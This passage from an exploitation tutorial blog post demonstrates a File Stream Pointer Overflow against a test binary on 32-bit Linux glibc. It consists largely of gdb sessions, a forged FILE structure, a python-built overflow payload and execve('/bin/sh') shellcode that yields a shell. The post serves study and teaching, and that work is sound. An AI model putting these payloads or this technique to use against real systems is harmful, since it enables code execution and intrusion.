0xb7e7a0c6 &lt;__GI__IO_fputs+38&gt;:	and    eax,0x8000</div><div class="line">   0xb7e7a0cb &lt;__GI__IO_fputs+43&gt;:	jne    0xb7e7a102 &lt;__GI__IO_fputs+98&gt;</div><div class="line">   0xb7e7a0cd &lt;__GI__IO_fputs+45&gt;:	mov    edx,DWORD PTR [esi+0x48]</div><div class="line">   0xb7e7a0d0 &lt;__GI__IO_fputs+48&gt;:	mov    ebp,DWORD PTR gs:0x8</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xbfffe750 --&gt; 0xbfffeb9a ('a' &lt;repeats 18 times&gt;, "AAAA")</div><div class="line">0004| 0xbfffe754 --&gt; 0xb7fc0000 --&gt; 0x1a9da8 </div><div class="line">0008| 0xbfffe758 --&gt; 0x0 </div><div class="line">0012| 0xbfffe75c --&gt; 0x0 </div><div class="line">0016| 0xbfffe760 --&gt; 0xbfffebb8 --&gt; 0x0 </div><div class="line">0020| 0xbfffe764 --&gt; 0xb7ff2500 (&lt;_dl_runtime_resolve+16&gt;:	pop    edx)</div><div class="line">0024| 0xbfffe768 --&gt; 0xbfffeba3 ("aaaaaaaaaAAAA")</div><div class="line">0028| 0xbfffe76c --&gt; 0xb7fc0000 --&gt; 0x1a9da8 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">__GI__IO_fputs (str=0xbfffeb9a 'a' &lt;repeats 18 times&gt;, "AAAA", fp=0x41414141) at iofputs.c:38</div><div class="line">38	iofputs.c: No such file or directory.</div><div class="line"><span class="meta"></span></div><div class="line">gdb-peda$ x/30xw $ebp-0x20</div><div class="line">0xbfffeb98: 0x61616161  0x61616161  0x61616161  0x61616161</div><div class="line">0xbfffeba8: 0x61616161  0x41414141  0x08048500  0x00000000</div></pre></td></tr></table></figure></p>
+<p>The program crached because of the FILE structure at AAAA which is not a valid address.<br>So next let’s make a fake FILE structure. You know it’s kind of difficult to make a fake FILE structure manually. So just take stderr(stdin or stdout) as the fake structure.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> p sizeof(FILE)</div><div class="line"><span class="meta">$</span>1 = 0x94</div><div class="line"><span class="meta">gdb-peda$</span> x/148bx stderr</div><div class="line">0xb7fc0960 &lt;_IO_2_1_stderr_&gt;:   0x86    0x20    0xad    0xfb    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc0968 &lt;_IO_2_1_stderr_+8&gt;: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc0970 &lt;_IO_2_1_stderr_+16&gt;:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc0978 &lt;_IO_2_1_stderr_+24&gt;:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc0980 &lt;_IO_2_1_stderr_+32&gt;:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc0988 &lt;_IO_2_1_stderr_+40&gt;:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc0990 &lt;_IO_2_1_stderr_+48&gt;:    0x00    0x00    0x00    0x00    0xc0    0x0a    0xfc    0xb7</div><div class="line">0xb7fc0998 &lt;_IO_2_1_stderr_+56&gt;:    0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09a0 &lt;_IO_2_1_stderr_+64&gt;:    0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09a8 &lt;_IO_2_1_stderr_+72&gt;:    0x8c    0x18    0xfc    0xb7    0xff    0xff    0xff    0xff</div><div class="line">0xb7fc09b0 &lt;_IO_2_1_stderr_+80&gt;:    0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09b8 &lt;_IO_2_1_stderr_+88&gt;:    0x00    0x0a    0xfc    0xb7    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09c0 &lt;_IO_2_1_stderr_+96&gt;:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09c8 &lt;_IO_2_1_stderr_+104&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09d0 &lt;_IO_2_1_stderr_+112&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09d8 &lt;_IO_2_1_stderr_+120&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09e0 &lt;_IO_2_1_stderr_+128&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09e8 &lt;_IO_2_1_stderr_+136&gt;:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</div><div class="line">0xb7fc09f0 &lt;_IO_2_1_stderr_+144&gt;:   0x00    0x00    0x00    0x00</div></pre></td></tr></table></figure>
+<p>Because of strcpy() will stop copy when meeting 0x00, so we must replace 0x00 with another value. From above we can know the variable test is at 0xbfffebac, so we make fake structure at 0xbfffebac - 160–&gt;0xbfffeb0c. Let’s just have a try what will happen when replacing the FILE structure:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">r "`python -c 'print "a"*882+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAAAA\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAAAAAA"+"\x0c\xeb\xff\xbf"'`"</div><div class="line"></div><div class="line"> [----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x80482 </div><div class="line">EBX: 0xb7fc0000 --&gt; 0x1a9da8 </div><div class="line">ECX: 0xbfffeb9a ("AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277")</div><div class="line">EDX: 0xb7fc188c --&gt; 0x1 </div><div class="line">ESI: 0xbfffeb0c --&gt; 0xfbad2086 </div><div class="line">EDI: 0x16 </div><div class="line">EBP: 0xb7e15940 (0xb7e15940)</div><div class="line">ESP: 0xbfffe750 --&gt; 0xbfffeb0c --&gt; 0xfbad2086 </div><div class="line">EIP: 0xb7e7a140 (&lt;__GI__IO_fputs+160&gt;:  call   DWORD PTR [eax+0x1c])</div><div class="line">EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0xb7e7a135 &lt;__GI__IO_fputs+149&gt;: mov    DWORD PTR [esp+0x8],edi</div><div class="line">   0xb7e7a139 &lt;__GI__IO_fputs+153&gt;: mov    DWORD PTR [esp],esi</div><div class="line">   0xb7e7a13c &lt;__GI__IO_fputs+156&gt;: mov    DWORD PTR [esp+0x4],ecx</div><div class="line">=&gt; 0xb7e7a140 &lt;__GI__IO_fputs+160&gt;: call   DWORD PTR [eax+0x1c]</div><div class="line">   0xb7e7a143 &lt;__GI__IO_fputs+163&gt;: cmp    edi,eax</div><div class="line">   0xb7e7a145 &lt;__GI__IO_fputs+165&gt;: jne    0xb7e7a190 &lt;__GI__IO_fputs+240&gt;</div><div class="line">   0xb7e7a147 &lt;__GI__IO_fputs+167&gt;: mov    edx,0x1</div><div class="line">   0xb7e7a14c &lt;__GI__IO_fputs+172&gt;: test   DWORD PTR [esi],0x8000</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xbfffeb0c --&gt; 0xfbad2086 </div><div class="line">arg[1]: 0xbfffeb9a ("AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277")</div><div class="line">arg[2]: 0x16 </div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xbfffe750 --&gt; 0xbfffeb0c --&gt; 0xfbad2086 </div><div class="line">0004| 0xbfffe754 --&gt; 0xbfffeb9a ("AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277")</div><div class="line">0008| 0xbfffe758 --&gt; 0x16 </div><div class="line">0012| 0xbfffe75c --&gt; 0x0 </div><div class="line">0016| 0xbfffe760 --&gt; 0xbfffebb8 --&gt; 0x0 </div><div class="line">0020| 0xbfffe764 --&gt; 0xb7ff2500 (&lt;_dl_runtime_resolve+16&gt;:  pop    edx)</div><div class="line">0024| 0xbfffe768 --&gt; 0xbfffeba3 --&gt; 0x414141b7 </div><div class="line">0028| 0xbfffe76c --&gt; 0xb7fc0000 --&gt; 0x1a9da8 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">0xb7e7a140 in __GI__IO_fputs (str=0xbfffeb9a "AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277", fp=0xbfffeb0c) at iofputs.c:40</div><div class="line">40  iofputs.c: No such file or directory.</div></pre></td></tr></table></figure></p>
+<p>I guess it should execute the function whose address was in _IO_jump_t table. However we didn’t provide the proper address, the program crashed. </p>
+<p>Let’s see how the program get the address saved in _IO_jump_t:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> x/10i __GI__IO_fputs+134</div><div class="line">   0xb7e7a126 &lt;__GI__IO_fputs+134&gt;: movsx  eax,BYTE PTR [esi+0x46]</div><div class="line">   0xb7e7a12a &lt;__GI__IO_fputs+138&gt;: mov    eax,DWORD PTR [esi+eax*1+0x94]  [#1]</div><div class="line">   0xb7e7a131 &lt;__GI__IO_fputs+145&gt;: mov    ecx,DWORD PTR [esp+0x30]</div><div class="line">   0xb7e7a135 &lt;__GI__IO_fputs+149&gt;: mov    DWORD PTR [esp+0x8],edi</div><div class="line">   0xb7e7a139 &lt;__GI__IO_fputs+153&gt;: mov    DWORD PTR [esp],esi</div><div class="line">   0xb7e7a13c &lt;__GI__IO_fputs+156&gt;: mov    DWORD PTR [esp+0x4],ecx</div><div class="line">=&gt; 0xb7e7a140 &lt;__GI__IO_fputs+160&gt;: call   DWORD PTR [eax+0x1c]   [#2]</div><div class="line">   0xb7e7a143 &lt;__GI__IO_fputs+163&gt;: cmp    edi,eax</div><div class="line">   0xb7e7a145 &lt;__GI__IO_fputs+165&gt;: jne    0xb7e7a190 &lt;__GI__IO_fputs+240&gt;</div><div class="line">   0xb7e7a147 &lt;__GI__IO_fputs+167&gt;: mov    edx,0x1</div></pre></td></tr></table></figure></p>
+<p>ESI points to our fake FILE structure. What we concern about is line #1 which will get the address of _IO_jump_t: first to get the byte value from [esi+0x46]. According to the source code of fputs, it should be the _vtable_offset field of FILE structure. Then to get the address of _IO_jump_t: generally, eax should equal 0, but in our exploit, we let eax equals 8. And next the program will push the args into stack and call _IO_file_xsputn in line #2. It’s perfectly match the structure of _IO_jump_t where _IO_file_xsputn is at the offset 0x1c.</p>
+<p>So finally, the content of input buffer is:<br>{ padding }—&gt;{ shellcode_address }—&gt;{ shellcode }—&gt;{ padding }—&gt;{ fake FILE structure }—&gt;{ _IO_jump_t address }—&gt;{ fake FILE pointer }</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">buffer--&gt;0xbfffe79a</div><div class="line">FFSS--&gt;0xbfffeb0c</div><div class="line">sc_addr--&gt;0xbfffe7bc</div><div class="line">shellcode: \x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80</div></pre></td></tr></table></figure>
+<p>Now let’s exploit the program:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> r "`python -c 'print "aa"+"b"*28 + "BBBB" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"</div><div class="line">Starting program: /home/wolfzhang/Desktop/file "`python -c 'print "aa"+"b"*28 + "BBBB" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"</div><div class="line">len: 1042</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"></div><div class="line"> [----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0xbfffe79c ('b' &lt;repeats 28 times&gt;, "BBBBj\vX1\366Vh//shh/bin\211\343\061ɉ\312̀", 'a' &lt;repeats 144 times&gt;...)</div><div class="line">EBX: 0xb7fc0000 --&gt; 0x1a9da8 </div><div class="line">ECX: 0xbfffeb9a ("AAAAAA\240\372\373\267AAAA\234\347\377\277\f\353\377\277")</div><div class="line">EDX: 0xb7fc188c --&gt; 0x1 </div><div class="line">ESI: 0xbfffeb0c --&gt; 0xfbad2086 </div><div class="line">EDI: 0x16 </div><div class="line">EBP: 0xb7e15940 (0xb7e15940)</div><div class="line">ESP: 0xbfffe74c --&gt; 0xb7e7a143 (&lt;__GI__IO_fputs+163&gt;: cmp    edi,eax)</div><div class="line">EIP: 0x42424242 ('BBBB')</div><div class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">Invalid $PC address: 0x42424242</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xbfffe74c --&gt; 0xb7e7a143 (&lt;__GI__IO_fputs+163&gt;:  cmp    edi,eax)</div><div class="line">0004| 0xbfffe750 --&gt; 0xbfffeb0c --&gt; 0xfbad2086 </div><div class="line">0008| 0xbfffe754 --&gt; 0xbfffeb9a ("AAAAAA\240\372\373\267AAAA\234\347\377\277\f\353\377\277")</div><div class="line">0012| 0xbfffe758 --&gt; 0x16 </div><div class="line">0016| 0xbfffe75c --&gt; 0x0 </div><div class="line">0020| 0xbfffe760 --&gt; 0xbfffebb8 --&gt; 0x0 </div><div class="line">0024| 0xbfffe764 --&gt; 0xb7ff2500 (&lt;_dl_runtime_resolve+16&gt;:  pop    edx)</div><div class="line">0028| 0xbfffe768 --&gt; 0xbfffeba3 --&gt; 0x414141b7 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x42424242 in ?? ()</div></pre></td></tr></table></figure>
+<p>Now we can control EIP, so next let’s replace ‘BBBB’ to the shellcode’s address.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> r "`python -c 'print "aa"+"b"*28 + "\xbc\xe7\xff\xbf" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"</div><div class="line">Starting program: /home/wolfzhang/Desktop/file "`python -c 'print "aa"+"b"*28 + "\xbc\xe7\xff\xbf" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"</div><div class="line">len: 1042</div><div class="line">process 4494 is executing new program: /bin/dash</div><div class="line"><span class="meta">$</span> id</div><div class="line">[New process 4498]</div><div class="line">process 4498 is executing new program: /usr/bin/id</div><div class="line">uid=1000(wolfzhang) gid=1000(wolfzhang) groups=1000(wolfzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
+<p>Look, we got a shell! </p>
+<h3 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h3><p><a href="http://www.evil0x.com/posts/13764.html" target="_blank" rel="external">Head First FILE Stream Pointer Overflow</a><br><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">abusing the FILE structure</a><br><a href="http://www.ouah.org/fsp-overflows.txt" target="_blank" rel="external">File Stream Pointer Overflows Paper</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/overflow/" rel="tag">#overflow</a>
+          
+            <a href="/tags/FSPO/" rel="tag">#FSPO</a>
+          
+            <a href="/tags/IO-list-all/" rel="tag">#_IO_list_all</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/11/12/2016-MMA-CTF-greeting/" rel="next" title="2016 MMA CTF greeting">
+                <i class="fa fa-chevron-left"></i> 2016 MMA CTF greeting
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/02/28/DLL-and-Code-Injection/" rel="prev" title="DLL and Code Injection">
+                DLL and Code Injection <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#FSPO–-gt-File-Stream-Pointer-Overflow"><span class="nav-number">1.</span> <span class="nav-text">FSPO–>File Stream Pointer Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Theory"><span class="nav-number">1.1.</span> <span class="nav-text">Theory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Links"><span class="nav-number">1.3.</span> <span class="nav-text">Links</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2016/11/19/File-Stream-Pointer-Overflow/';
+      var disqus_title = "File Stream Pointer Overflow";
+      var disqus_url = 'http://yoursite.com/2016/11/19/File-Stream-Pointer-Overflow/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
